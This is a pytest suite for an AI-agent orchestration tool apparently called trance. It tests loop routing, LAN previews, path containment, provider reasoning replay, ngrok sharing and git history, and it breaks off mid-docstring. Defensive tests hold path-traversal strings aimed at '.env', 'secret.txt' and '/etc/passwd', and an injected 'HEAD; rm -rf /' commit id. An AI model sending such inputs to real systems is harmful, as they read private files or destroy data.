def _tiered_loop():
    """A loop whose FAILED exit changes tactic twice and then gives up."""
    from trance.loops import (EXIT_LOOP, FAIL_LOOP, Edge, FAILED, Loop,
                              LoopNode, SUCCESS)
    return Loop(name="escalating", nodes=[
        LoopNode(id="n_test", role="tester",
                 on={SUCCESS: Edge(EXIT_LOOP),
                     # twice back to the developer, then twice to the developer
                     # on its backup model, then nothing — the loop halts.
                     FAILED: [Edge("n_dev", max_visits=2),
                              Edge("n_dev", max_visits=2, backup=True)]}),
        LoopNode(id="n_dev", role="backend",
                 on={SUCCESS: Edge("n_test", max_visits=9), FAILED: Edge(FAIL_LOOP)}),
    ])


def test_a_tiered_exit_routes_by_how_often_it_was_taken():
    loop = _tiered_loop()
    from trance.loops import FAILED
    tester = loop.node("n_test")

    first, second = tester.route(FAILED, 0), tester.route(FAILED, 1)
    assert (first.target, first.backup) == ("n_dev", False)
    assert (second.target, second.backup) == ("n_dev", False)

    third, fourth = tester.route(FAILED, 2), tester.route(FAILED, 3)
    assert (third.target, third.backup) == ("n_dev", True)
    assert (fourth.target, fourth.backup) == ("n_dev", True)

    # The fifth failure has nowhere left to go, which is the point.
    assert tester.route(FAILED, 4) is None
    assert tester.allowance(FAILED) == 4


def test_a_tier_that_leaves_the_loop_makes_the_rest_dead():
    from trance.loops import EXIT_LOOP, Edge, FAILED, Loop, LoopNode, SUCCESS, validate
    loop = Loop(name="dead", nodes=[LoopNode(id="a", role="tester", on={
        SUCCESS: Edge(EXIT_LOOP),
        FAILED: [Edge("fail"), Edge("a", max_visits=3)]})])
    problem = validate(loop, {"tester"}, {"tester"})
    assert problem and "can never be taken" in problem


def test_tiers_survive_a_round_trip():
    from trance.loops import Loop
    loop = _tiered_loop()
    again = Loop.from_dict(loop.to_dict())
    routes = again.node("n_test").on["FAILED"]
    assert [(r.target, r.max_visits, r.backup) for r in routes] == [
        ("n_dev", 2, False), ("n_dev", 2, True)]


def test_a_single_edge_still_reads_as_one_route():
    """Every loop written before tiers existed keeps working."""
    from trance.loops import Loop
    loop = Loop.from_dict({"name": "old", "nodes": [
        {"id": "a", "role": "tester",
         "on": {"SUCCESS": {"target": "exit"}, "FAILED": {"target": "a", "max_visits": 2}}}]})
    node = loop.node("a")
    assert node.edge("FAILED").target == "a"
    assert node.route("FAILED", 1).target == "a"
    assert node.route("FAILED", 2) is None


def test_a_route_can_send_the_next_agent_to_its_backup_model(tmp_path, monkeypatch):
    """Two failures go back to the developer as usual; the next two go back to
    the same developer on its backup model, and the fifth halts the loop.

    The point of a later tier is that the earlier one did not work, and the
    model is the one thing an ordinary retry never changes."""
    from trance.agents.store import LoopStore
    from trance.flow import Step

    engine = _backup_engine(tmp_path, after=99)      # never switches on its own
    store = LoopStore(tmp_path / "l.json", seed=False)
    store.upsert(_tiered_loop())
    engine.loops = store

    seen = []

    def fake(**kw):
        seen.append((kw["role"].name, kw["config"].model))
        return _Turn(None, "x", outcome=("FAILED", "still red")
                     if kw["role"].name == "tester" else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    step = Step(role="", loop="escalating", task="t")
    engine._execute(step)

    devs = [model for name, model in seen if name == "backend"]
    assert devs == ["small-model", "small-model", "big-model", "big-model"]
    assert step.status == "failed"

    ended = [e for e in engine.bus.history(engine.session.id) if e.type == "loop_exhausted"]
    assert ended and ended[-1].payload["max_visits"] == 4
    switched = [e for e in engine.bus.history(engine.session.id) if e.type == "loop_route"]
    assert len(switched) == 2 and switched[0].payload["backup"] is True


def test_a_routes_backup_applies_to_that_block_only(tmp_path, monkeypatch):
    """The tier says "this failure goes to the developer's backup", not
    "everything from here on runs on backups"."""
    from trance.agents.store import LoopStore
    from trance.flow import Step
    from trance.loops import EXIT_LOOP, FAIL_LOOP, Edge, FAILED, Loop, LoopNode, SUCCESS

    engine = _backup_engine(tmp_path, after=99)
    loop = Loop(name="once", start="n_test", nodes=[
        LoopNode(id="n_test", role="tester",
                 on={SUCCESS: Edge(EXIT_LOOP),
                     FAILED: Edge("n_dev", max_visits=4, backup=True)}),
        # Back to the tester afterwards — on its own model, not the developer's tier.
        LoopNode(id="n_dev", role="backend",
                 on={SUCCESS: Edge("n_test", max_visits=4), FAILED: Edge(FAIL_LOOP)}),
    ])
    store = LoopStore(tmp_path / "l.json", seed=False)
    store.upsert(loop)
    engine.loops = store

    seen, results = [], iter(["FAILED", "SUCCESS", "SUCCESS"])

    def fake(**kw):
        seen.append((kw["role"].name, kw["config"].model))
        return _Turn(None, "x", outcome=(next(results, "SUCCESS"), ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(Step(role="", loop="once", task="t"))

    assert seen == [("tester", "small-model"),      # first pass, ordinary
                    ("backend", "big-model"),       # the route asked for the backup
                    ("tester", "small-model")]      # and it stopped there


def test_a_preview_is_reachable_from_the_network(tmp_path):
    """A preview you cannot open on your phone is half a preview: a UI is worth
    looking at on a real screen, and trance may not be running on it."""
    import socket
    import urllib.request

    from trance import preview

    folder = tmp_path / "site"
    folder.mkdir()
    (folder / "index.html").write_text("<h1>hi</h1>")
    served = preview.serve(folder)
    try:
        # Bound to every interface, not just the loopback.
        assert served.server.server_address[0] == "0.0.0.0"
        address = preview.lan_address()
        assert urllib.request.urlopen(
            f"http://{address}:{served.port}/index.html").read() == b"<h1>hi</h1>"
        # And still on the loopback, for whoever is sitting at the machine.
        assert urllib.request.urlopen(
            f"http://127.0.0.1:{served.port}/index.html").status == 200
        assert socket.inet_aton(address)          # a real address, not a name
    finally:
        served.stop()


def test_the_preview_link_uses_the_host_the_browser_came_from(tmp_path):
    """Someone browsing trance at 192.168.1.5 cannot use a 127.0.0.1 link."""
    from trance import preview

    folder = tmp_path / "site"
    folder.mkdir()
    served = preview.serve(folder)
    try:
        assert served.at("192.168.1.5") == f"http://192.168.1.5:{served.port}/"
        assert served.at("localhost") == f"http://localhost:{served.port}/"
        assert served.at("") == served.url        # no Host to go on: the LAN address
    finally:
        served.stop()


def test_a_preview_still_refuses_to_leave_its_folder(tmp_path):
    """Now that it is on the network, containment is the whole security story."""
    import urllib.error
    import urllib.request

    from trance import preview

    (tmp_path / "secret.txt").write_text("private")
    folder = tmp_path / "site"
    folder.mkdir()
    (folder / "index.html").write_text("<h1>hi</h1>")
    (folder / ".env").write_text("KEY=abc")
    served = preview.serve(folder)
    try:
        for path in ("/../secret.txt", "/%2e%2e/secret.txt", "/.env"):
            try:
                body = urllib.request.urlopen(served.at("127.0.0.1")[:-1] + path).read()
            except urllib.error.HTTPError:
                continue                          # refused outright is fine too
            assert b"private" not in body and b"KEY=abc" not in body
    finally:
        served.stop()


def test_a_leading_slash_names_the_same_file(tmp_path):
    """A model writes `/src/game/scene.js` for the file it read as
    `src/game/scene.js`, because that is how the HTML it is editing refers to
    it. Joining an absolute path throws the project root away, so that used to
    be a 404 on read, "outside the project directory" on write, and no such
    symbol in the graph — three messages for one harmless habit."""
    from trance import paths

    root = tmp_path / "metro"
    (root / "src" / "game").mkdir(parents=True)
    (root / "src" / "game" / "scene.js").write_text("x")

    same = root / "src" / "game" / "scene.js"
    for written in ("src/game/scene.js", "/src/game/scene.js", "./src/game/scene.js",
                    "src/./game/scene.js", "/src/./game/scene.js",
                    "src//game/scene.js", str(same)):
        assert paths.inside(root, written) == same, written


def test_dot_segments_are_collapsed_but_escapes_are_not(tmp_path):
    """Normalising is not forgiving: `..` still leaves the project, and is
    still refused."""
    from trance import paths

    root = tmp_path / "metro"
    root.mkdir()
    (tmp_path / "secret.txt").write_text("private")

    assert paths.relative(root, "src/./game/../game/scene.js") == "src/game/scene.js"
    assert paths.inside(root, "../secret.txt") is None
    assert paths.inside(root, "/../secret.txt") is None
    assert paths.inside(root, "src/../../secret.txt") is None
    assert paths.inside(root, "") == root
    # An absolute path that is not in the project is read as project-relative,
    # since that is what it means coming from a model. It cannot reach the real
    # /etc/passwd either way — the point is that it stays contained.
    assert paths.inside(root, "/etc/passwd") == root / "etc" / "passwd"


def test_a_rooted_path_reaches_the_graph(tmp_path):
    """The symbol index matches file paths exactly, so it is the least
    forgiving surface of the three."""
    from trance.db import GraphDB
    from trance.indexer.service import default_db_path, index_repo
    from trance.worker.tools import ContextTools

    root = tmp_path / "metro"
    (root / "src" / "game").mkdir(parents=True)
    (root / "src" / "game" / "scene.js").write_text(
        "export function buildScene() { return 1; }\n")
    db = GraphDB(default_db_path(root))
    index_repo(root, db)
    tools = ContextTools(db, root)

    for query in ("src/game/scene.js", "/src/game/scene.js", "./src/game/scene.js",
                  "src/./game/scene.js", "/src/./game/scene.js", "game/scene.js"):
        assert tools.get_definition(query).hit, query
    for query in ("src/game/scene.js::buildScene", "/src/game/scene.js::buildScene"):
        assert tools.get_definition(query).hit, query

    # A bare symbol has no path part and must not be touched.
    assert tools.get_definition("buildScene").hit
    assert not tools.get_definition("../../etc/passwd").hit


def test_an_agent_can_write_to_a_rooted_path(tmp_path):
    """Refusing this as "outside the project" told the agent to work around a
    problem it did not have, and it would try the same path again."""
    from trance.agents.roles import AgentRole
    from trance.agents.tools import AgentTools

    root = tmp_path / "metro"
    (root / "src").mkdir(parents=True)
    role = AgentRole(name="frontend", title="Frontend", description="d",
                     system_prompt="p", paths=["src/**"], toolsets=["files"])
    tools = AgentTools(root, role)

    assert tools.write_file("/src/scene.js", "export const a = 1;\n").ok
    assert (root / "src" / "scene.js").read_text() == "export const a = 1;\n"
    # And the remit is judged on the real path, not the one as typed.
    assert tools.write_file("/server/app.py", "x").ok is False


def test_a_providers_reasoning_goes_back_exactly_as_it_came():
    """DeepSeek's thinking mode validates that an earlier assistant turn comes
    home with its `reasoning_content`. Checked against the endpoint: `null` is
    accepted, an empty string is accepted, and *absent* is a 400 —

        "The `reasoning_content` in the thinking mode must be passed back."

    So this is not ours to tidy, summarise or drop, even when it is empty."""
    from trance.worker.client import _parse as parse_response

    message = {
        "role": "assistant", "content": "",
        "reasoning_content": "a long private deliberation",
        "tool_calls": [{"id": "c1", "type": "function",
                        "function": {"name": "read_file",
                                     "arguments": '{"path": "src/main.js"}'}}],
    }
    response = parse_response(
        {"choices": [{"message": message, "finish_reason": "tool_calls"}], "usage": {}})

    assert "a long private deliberation" in response.reasoning     # shown to you
    assert response.replay() == message                            # and sent back whole


def test_a_rebuilt_message_still_carries_what_must_round_trip():
    """The paths that build an assistant message themselves — a salvaged tool
    call, or a provider that returned none — are where the field went missing,
    and a null one has to be kept rather than skipped as empty."""
    from trance.providers.base import ChatResponse, ToolCall

    response = ChatResponse(
        text="I will read it", finish_reason="stop",
        raw_message={"role": "assistant", "content": "printed the call instead",
                     "reasoning_content": None})

    salvaged = response.replay(text="I will read it")
    assert "reasoning_content" in salvaged           # present, not dropped as empty
    assert salvaged["reasoning_content"] is None
    assert salvaged["content"] == "I will read it"

    call = ToolCall(id="c1", name="read_file", arguments={"path": "a.js"})
    rebuilt = ChatResponse(text="", finish_reason="tool_calls").replay(calls=[call])
    assert rebuilt["tool_calls"][0]["function"]["name"] == "read_file"


def test_a_null_reasoning_is_never_sent_back():
    """DeepSeek returns `"reasoning_content": null` on a turn it spent no
    thought on, and then rejects that same null on the next request:

        400 — "The `reasoning_content` in the thinking mode must be passed
        back to the API."

    Checked against the endpoint: absent is accepted, a string is accepted,
    null is the one shape that fails. So a null is filled in rather than
    echoed."""
    from trance.worker.client import _parse as parse_response

    body = {"choices": [{"message": {
        "role": "assistant", "content": "<think>brief</think>Reading it.",
        "reasoning_content": None,
        "tool_calls": [{"id": "c1", "type": "function",
                        "function": {"name": "read_file", "arguments": "{}"}}],
    }, "finish_reason": "tool_calls"}], "usage": {}}
    replayed = parse_response(body).replay()

    assert replayed["reasoning_content"] == "brief"     # the thinking it did do
    assert replayed["tool_calls"][0]["id"] == "c1"

    # Nothing to fill it with: an empty string, still never null.
    quiet = {"choices": [{"message": {"role": "assistant", "content": "Done.",
                                      "reasoning_content": None},
                          "finish_reason": "stop"}], "usage": {}}
    assert parse_response(quiet).replay()["reasoning_content"] == ""


def test_a_provider_that_sends_no_reasoning_field_is_left_alone():
    """llama.cpp and OpenAI do not use the field; inventing one for them would
    be a change to a request that was working."""
    from trance.worker.client import _parse as parse_response

    body = {"choices": [{"message": {"role": "assistant", "content": "Done."},
                         "finish_reason": "stop"}], "usage": {}}
    assert "reasoning_content" not in parse_response(body).replay()


def test_a_page_that_cannot_run_as_files_says_which_import_stops_it(tmp_path):
    """"Needs a build step" guessed from a config file is a guess. Whether the
    page works as files is answerable by looking, so it is looked at."""
    from trance import preview

    site = tmp_path / "site"
    (site / "src").mkdir(parents=True)
    (site / "index.html").write_text('<script type="module" src="/src/main.js">')
    (site / "src" / "main.js").write_text(
        "import * as THREE from 'three';\nimport { a } from './local.js';\n")
    (site / "src" / "local.js").write_text("export const a = 1;\n")

    found = preview.bare_imports(site)
    assert [(f["file"], f["specifier"], f["line"]) for f in found] == [
        ("src/main.js", "three", 1)]          # the relative import is fine


def test_a_project_that_only_uses_relative_imports_is_not_flagged(tmp_path):
    """A vite.config.js is not evidence: plenty of projects have one and still
    serve perfectly well as files."""
    from trance import preview

    site = tmp_path / "site"
    site.mkdir()
    (site / "vite.config.js").write_text("export default {}")
    (site / "playwright.config.js").write_text("import { x } from '@playwright/test';")
    (site / "tests").mkdir()
    (site / "tests" / "e2e.js").write_text("import { test } from '@playwright/test';")
    (site / "app.js").write_text("import { a } from './lib.js';\n")

    # Config and test files import packages by name and always have — they are
    # not evidence about the page, so citing one would be the wrong reason.
    assert preview.bare_imports(site) == []


def test_a_running_tunnel_is_offered_as_the_share_link(tmp_path):
    """The tunnel is started in a terminal, so its URL lives in that terminal.
    trance does not start it — but it can see one, and a share link you have to
    go and find in another window is a share link you will not use."""
    import http.server
    import json
    import threading

    from trance import preview

    payload = json.dumps({"tunnels": [
        {"public_url": "http://elsewhere.ngrok-free.dev",
         "config": {"addr": "http://localhost:1111"}},
        {"public_url": "http://this-one.ngrok-free.dev",
         "config": {"addr": "http://localhost:2222"}},
        {"public_url": "https://this-one.ngrok-free.dev",
         "config": {"addr": "http://localhost:2222"}},
    ]}).encode()

    class Agent(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("content-type", "application/json")
            self.send_header("content-length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *a):
            pass

    fake = http.server.HTTPServer(("127.0.0.1", 0), Agent)
    threading.Thread(target=fake.serve_forever, daemon=True).start()
    api = f"http://127.0.0.1:{fake.server_address[1]}/api/tunnels"
    try:
        # The port has to match: a tunnel pointed at something else is not this
        # page's link, and https wins over plain when both are offered.
        assert preview.public_url(2222, api=api) == "https://this-one.ngrok-free.dev"
        assert preview.public_url(1111, api=api) == "http://elsewhere.ngrok-free.dev"
        assert preview.public_url(3333, api=api) == ""
    finally:
        fake.shutdown()


def test_no_tunnel_agent_is_the_normal_case(tmp_path):
    """Almost nobody runs ngrok, so this must cost nothing and never raise."""
    from trance import preview

    assert preview.public_url(8080, api="http://127.0.0.1:4999/api/tunnels") == ""


def test_a_folder_comes_back_on_the_same_port(tmp_path):
    """A preview that reappears on a new port breaks whatever was pointed at
    the old one — a tunnel, a link you sent someone, a tab left open."""
    from trance import preview

    folder = tmp_path / "site"
    folder.mkdir()
    (folder / "index.html").write_text("<h1>hi</h1>")

    first = preview.serve(folder)
    port = first.port
    first.stop()

    again = preview.serve(folder, port=port)
    try:
        assert again.port == port
    finally:
        again.stop()

    # And a port that is genuinely taken falls back rather than failing.
    holder = preview.serve(folder)
    try:
        other = preview.serve(folder, port=holder.port)
        try:
            assert other.port and other.port != holder.port
        finally:
            other.stop()
    finally:
        holder.stop()


def test_a_step_saved_mid_flight_is_not_running_after_a_restart(tmp_path):
    """A killed or restarted process leaves whatever was executing marked
    "running". Nothing is executing at load time, so that status is a lie with
    two consequences: the step shows as running forever, and next_pending()
    skips it because it is not pending — so a second stranded step makes the
    flow look like it is running two at once. Which is exactly what happened."""
    from trance.session import Session, SessionStore

    store = SessionStore(tmp_path)
    session = store.create("s", str(tmp_path / "proj"))
    from trance.flow import Step
    session.flow.steps = [
        Step(id="a", role="backend", task="one", status="done"),
        Step(id="b", role="", loop="review-front-end", task="two", status="running"),
        Step(id="c", role="", loop="review-front-end", task="three", status="verifying"),
        Step(id="d", role="backend", task="four", status="failed"),
    ]
    session.status = "running"
    store.save(session)

    again = SessionStore(tmp_path).get(session.id)
    statuses = {s.id: s.status for s in again.flow.steps}
    assert statuses == {"a": "done", "b": "pending", "c": "pending", "d": "failed"}
    assert again.status == "ready"
    # ...and the flow has work to pick up again, rather than silently stalling.
    assert again.flow.next_pending().id == "b"


def test_a_review_comment_needs_no_file(tmp_path):
    """"The controls are unusable on a phone" is about the result, not a line.
    Making it fit a line number means picking one arbitrarily, or not writing
    it down."""
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    project = tmp_path / "proj"
    project.mkdir()
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]

    general = client.post(f"/api/sessions/{sid}/review",
                          json={"note": "the controls are unusable on a phone"})
    assert general.status_code == 200
    assert general.json()["path"] == "" and general.json()["line"] == 0

    client.post(f"/api/sessions/{sid}/review",
                json={"path": "src/main.js", "line": 12, "note": "rename this"})
    assert client.post(f"/api/sessions/{sid}/review",
                       json={"note": "   "}).status_code == 400

    sent = client.post(f"/api/sessions/{sid}/review/finish", json={})
    assert sent.status_code == 200
    task = client.get(f"/api/sessions/{sid}").json()["flow"]["steps"][-1]["task"]
    # The overall comment leads, and is not disguised as a line comment.
    assert "About this change overall" in task
    assert "- the controls are unusable on a phone" in task
    assert task.index("overall") < task.index("src/main.js")
    assert "line 12" in task


def test_sharing_needs_something_to_share(tmp_path):
    """A tunnel to nothing is a link that answers 502, so it is refused."""
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    project = tmp_path / "proj"
    project.mkdir()
    (project / "index.html").write_text("<h1>hi</h1>")
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]

    refused = client.post(f"/api/sessions/{sid}/share", json={})
    assert refused.status_code == 409 and "nothing is being served" in refused.text


def test_a_missing_ngrok_says_so_rather_than_failing_obscurely(tmp_path, monkeypatch):
    from trance import preview

    # No agent running — otherwise this depends on whatever the machine happens
    # to have open, which is how a test starts failing for the wrong reason.
    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [])
    monkeypatch.setattr(preview, "agent_running", lambda *a, **k: False)
    monkeypatch.setattr("trance.preview.shutil.which", lambda _: None)
    with pytest.raises(preview.NoTunnelTool) as raised:
        preview.start_tunnel(1234)
    assert "not on trance's PATH" in str(raised.value)


def test_an_agent_already_tunnelling_this_port_is_used_as_is(monkeypatch):
    """Free ngrok allows one agent at a time. A second one gets ERR_NGROK_334,
    and "502" is a poor way to learn that the tunnel you started an hour ago is
    still up."""
    from trance import preview

    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [
        {"public_url": "http://x.ngrok-free.dev", "config": {"addr": "http://localhost:5000"}},
        {"public_url": "https://x.ngrok-free.dev", "config": {"addr": "http://localhost:5000"}},
    ])

    same = preview.start_tunnel(5000)
    assert same.url == "https://x.ngrok-free.dev"      # https wins
    assert same.adopted is True and same.running is True
    # Not ours to kill: someone else started it.
    assert same.proc is None and same.via_agent is False
    same.stop()


def test_sharing_repoints_a_busy_agent_and_only_fails_if_it_will_not(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from trance import preview
    from trance.config import Config
    from trance.server import app as app_module

    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [
        {"name": "command_line", "public_url": "https://x.ngrok-free.dev",
         "config": {"addr": "http://localhost:1"}}])
    monkeypatch.setattr(preview, "retarget_agent",
                        lambda port, policy="": "https://x.ngrok-free.dev")

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    project = tmp_path / "proj"
    project.mkdir()
    (project / "index.html").write_text("<h1>hi</h1>")
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]
    client.post(f"/api/sessions/{sid}/preview", json={"path": "index.html"})

    shared = client.post(f"/api/sessions/{sid}/share", json={})
    assert shared.status_code == 200
    assert shared.json()["url"] == "https://x.ngrok-free.dev"

    # Only when the agent refuses to hand its tunnel over is this a conflict.
    monkeypatch.setattr(preview, "retarget_agent", lambda port, policy="": "")
    client.delete(f"/api/sessions/{sid}/share")
    refused = client.post(f"/api/sessions/{sid}/share", json={})
    assert refused.status_code == 409 and "would not give up" in refused.json()["detail"]


def test_ngroks_own_complaint_is_what_gets_reported(tmp_path):
    """"ngrok exited" tells you nothing. "authentication failed" tells you to go
    and add your authtoken."""
    from trance import preview

    said = preview._ngrok_failure(
        "ERROR:  authentication failed: This session is not authenticated.\n"
        "ERROR:  ERR_NGROK_4018\n")
    assert said == "authentication failed: This session is not authenticated."
    # Anything it says is better than anything we would invent...
    assert preview._ngrok_failure("could not bind: address in use\n") == \
        "could not bind: address in use"
    # ...but when it says nothing, the usual reason is worth naming.
    assert "authtoken" in preview._ngrok_failure("")


def test_a_tunnel_does_not_outlive_the_preview_it_points_at(tmp_path, monkeypatch):
    """Stopping the preview leaves the public URL answering 502 otherwise."""
    from fastapi.testclient import TestClient

    from trance import preview
    from trance.config import Config
    from trance.server import app as app_module

    stopped = []

    class FakeTunnel:
        port, url, running, proc = 1, "https://x.ngrok-free.dev", True, None

        def to_dict(self):
            return {"url": self.url, "port": self.port, "running": True,
                    "protected": False}

        def stop(self):
            stopped.append(True)

    monkeypatch.setattr(preview, "start_tunnel", lambda port, policy="": FakeTunnel())

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    project = tmp_path / "proj"
    project.mkdir()
    (project / "index.html").write_text("<h1>hi</h1>")
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]

    client.post(f"/api/sessions/{sid}/preview", json={"path": "index.html"})
    assert client.post(f"/api/sessions/{sid}/share", json={}).status_code == 200
    client.delete(f"/api/sessions/{sid}/preview")
    assert stopped, "stopping the preview left its tunnel running"


def test_a_review_runs_next_not_last():
    """The comments name lines in the code as it is right now. Queued behind
    every other pending step, they are acted on after those lines have moved —
    and it reads as if the review was ignored."""
    from trance.flow import Flow, Step

    flow = Flow(steps=[
        Step(id="1", role="frontend", task="a", status="done"),
        Step(id="2", role="frontend", task="b", status="failed"),
        Step(id="3", role="frontend", task="c", status="running"),
        Step(id="4", role="frontend", task="d", status="pending"),
        Step(id="5", role="frontend", task="e", status="pending"),
    ])
    where = flow.insert_next(Step(id="rv", role="frontend", task="the review"))

    # After the one in flight, ahead of everything merely queued.
    assert where == 4
    assert [s.id for s in flow.steps] == ["1", "2", "3", "rv", "4", "5"]
    assert flow.next_pending().id == "rv"


def test_a_review_with_nothing_running_goes_first(tmp_path):
    from trance.flow import Flow, Step

    flow = Flow(steps=[
        Step(id="1", role="frontend", task="a", status="done"),
        Step(id="2", role="frontend", task="b", status="pending"),
    ])
    assert flow.insert_next(Step(id="rv", role="frontend", task="review")) == 2
    assert flow.next_pending().id == "rv"

    # ...and onto the end when there is nothing left to be ahead of.
    finished = Flow(steps=[Step(id="1", role="frontend", task="a", status="done")])
    assert finished.insert_next(Step(id="rv", role="frontend", task="review")) == 2


def test_the_review_step_lands_where_it_says_it_does(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    project = tmp_path / "proj"
    project.mkdir()
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]

    client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "backend", "task": "one", "status": "done"},
        {"role": "backend", "task": "two", "status": "pending"},
        {"role": "backend", "task": "three", "status": "pending"},
    ]})
    client.post(f"/api/sessions/{sid}/review",
                json={"path": "a.js", "line": 3, "note": "rename this"})
    sent = client.post(f"/api/sessions/{sid}/review/finish", json={})
    assert sent.status_code == 200

    steps = client.get(f"/api/sessions/{sid}").json()["flow"]["steps"]
    assert [s["task"][:5] for s in steps] == ["one", "Addre", "two", "three"]


def test_what_was_fixed_lists_the_commits_each_agent_made(tmp_path):
    """A run is one commit per step, so the list is what each agent did and in
    what order. One combined diff hides both."""
    from trance import vcs

    project = tmp_path / "proj"
    project.mkdir()
    vcs.ensure_repo(project)
    (project / "a.js").write_text("const PORT = 3000;\n")
    vcs.commit_all(project, "before the review")
    before = vcs.head(project)

    (project / "a.js").write_text("const PORT = process.env.PORT;\n")
    vcs.commit_all(project, "backend: read the port from the environment")
    (project / "a.test.js").write_text("test('default port', () => {});\n")
    vcs.commit_all(project, "tester: cover the new default")

    made = vcs.commits_between(project, before)
    # Oldest first: the order it happened in. (commit_all stamps "trance: ".)
    assert [c["subject"] for c in made] == [
        "trance: backend: read the port from the environment",
        "trance: tester: cover the new default"]
    assert made[0]["files"] == 1 and made[0]["added"] == 1 and made[0]["removed"] == 1
    assert made[1]["added"] == 1 and made[1]["removed"] == 0

    one = vcs.show(project, made[0]["sha"])
    assert one["subject"].endswith("backend: read the port from the environment")
    assert "process.env.PORT" in one["diff"] and "a.js" in one["stat"]
    assert one["clipped"] is False


def test_a_commit_id_that_is_not_one_is_refused(tmp_path):
    """The sha reaches git from a URL, so it is checked before it gets there."""
    from trance import vcs

    project = tmp_path / "proj"
    project.mkdir()
    vcs.ensure_repo(project)
    (project / "a.js").write_text("x\n")
    vcs.commit_all(project, "one")

    assert vcs.show(project, "") == {}
    assert vcs.show(project, "HEAD; rm -rf /") == {}
    assert vcs.show(project, "../../etc/passwd") == {}
    assert vcs.show(project, "no-such-commit") == {}
    assert vcs.show(project, vcs.head(project))["subject"].endswith("one")


def test_a_huge_commit_is_clipped_rather_than_streamed_whole(tmp_path):
    from trance import vcs

    project = tmp_path / "proj"
    project.mkdir()
    vcs.ensure_repo(project)
    (project / "big.txt").write_text("x\n")
    vcs.commit_all(project, "one")
    (project / "big.txt").write_text("\n".join(f"line {i}" for i in range(20_000)))
    vcs.commit_all(project, "a lot at once")

    shown = vcs.show(project, vcs.head(project), max_chars=5_000)
    assert shown["clipped"] is True and len(shown["diff"]) == 5_000


def test_trances_own_index_stays_out_of_the_project_history(tmp_path):
    """The graph db is binary and rewritten on every index. Committed, it puts
    "Binary files differ" in the middle of every diff an agent made — in a repo
    whose whole point is being readable afterwards."""
    from trance import vcs

    project = tmp_path / "proj"
    (project / ".trance").mkdir(parents=True)
    (project / "app.js").write_text("const a = 1;\n")
    (project / ".trance" / "graph.db").write_bytes(b"\x00binary\x00")
    (project / ".trance" / "PLAN.md").write_text("# the plan\n")

    vcs.ensure_repo(project)
    vcs.commit_all(project, "first")

    tracked = vcs.changed_between(project, "HEAD")     # nothing outstanding
    assert tracked == []
    listed = [line for line in
              vcs._run(project, "ls-files")[1].splitlines()]
    assert "app.js" in listed
    assert ".trance/graph.db" not in listed
    # ...but the plan and the memory are written for you to read, so they stay.
    assert ".trance/PLAN.md" in listed


def test_an_index_already_committed_is_untracked_not_deleted(tmp_path):
    from trance import vcs

    project = tmp_path / "proj"
    (project / ".trance").mkdir(parents=True)
    (project / "app.js").write_text("const a = 1;\n")
    (project / ".trance" / "graph.db").write_bytes(b"\x00binary\x00")

    vcs.ensure_repo(project)
    (project / ".gitignore").unlink()                  # a repo from before this existed
    vcs.commit_all(project, "with the index in it")
    assert ".trance/graph.db" in vcs._run(project, "ls-files")[1]

    vcs.ignore_trance_files(project)
    dropped = vcs.untrack_ignored(project)

    assert dropped == [".trance/graph.db"]
    assert ".trance/graph.db" not in vcs._run(project, "ls-files")[1]
    assert (project / ".trance" / "graph.db").exists()  # still on disk, still usable


def test_the_review_history_is_every_review_newest_first(tmp_path, monkeypatch):
    """One review is a moment; the history is what you want when you are
    deciding whether the last round of comments landed.

    Takes the fixture's fake engine deliberately: sending a review starts the
    flow, and a real engine checkpointing the same repository commits the very
    change this test is about to commit — which fails about one run in three.
    """
    from trance import vcs

    _, client, sid, project = _files_client(tmp_path, monkeypatch=monkeypatch)

    assert client.get(f"/api/sessions/{sid}/reviews").json()["reviews"] == []

    client.post(f"/api/sessions/{sid}/review",
                json={"path": "server/app.js", "line": 1, "note": "read the port from env"})
    client.post(f"/api/sessions/{sid}/review/finish", json={})
    (project / "server" / "app.js").write_text("const PORT = process.env.PORT;\n")
    assert vcs.commit_all(project, "backend: did that").ok

    client.post(f"/api/sessions/{sid}/review", json={"note": "unusable on a phone"})
    client.post(f"/api/sessions/{sid}/review/finish", json={})

    history = client.get(f"/api/sessions/{sid}/reviews").json()["reviews"]
    assert len(history) == 2
    # Newest first: it is the one you are waiting on.
    assert history[0]["notes"][0]["note"] == "unusable on a phone"
    assert history[1]["notes"][0]["note"] == "read the port from env"
    assert history[0]["at"] >= history[1]["at"]

    # The older one carries the commit that answered it.
    assert any("did that" in c["subject"] for c in history[1]["commits"])


def test_a_busy_agent_is_repointed_rather_than_refused(monkeypatch):
    """Free ngrok allows one agent at a time. Adding a second tunnel does not
    work either — both claim the same public URL and it answers 502 — so the
